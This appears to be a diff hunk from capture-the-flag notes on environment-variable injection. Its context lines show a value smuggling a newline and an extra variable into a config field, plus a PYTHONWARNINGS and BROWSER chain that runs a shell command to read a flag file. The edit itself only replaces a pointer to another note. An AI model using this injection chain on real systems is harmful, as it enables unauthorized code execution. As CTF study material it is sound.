@@ -135,7 +135,9 @@ Escape sequences and newlines in values:
 backup_server=x\'\nEVIL_VAR=malicious_value\n\'
 ```
 Chain with `PYTHONWARNINGS=ignore::antigravity.Foo::0` + `BROWSER=/bin/sh -c "cat /flag" %s` for RCE.
-See ctf-misc/pyjails.md for PYTHONWARNINGS technique details.
+Apply `PYTHONWARNINGS` to reach an importable module through the warnings
+machinery; the stack ships no `ctf-misc` note set, so treat this as the whole
+lead.
 
 ---
 
